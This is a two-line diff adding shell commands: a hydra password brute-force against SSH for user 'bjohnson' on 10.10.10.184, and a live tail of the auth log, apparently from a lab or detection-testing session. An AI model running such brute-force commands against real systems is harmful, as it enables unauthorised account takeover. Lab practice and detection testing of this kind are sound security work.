@@ -1,1 +1,2 @@
-
+hydra -l bjohnson -P ~/passwords.txt ssh://10.10.10.184
+sudo tail -f /var/log/auth.log
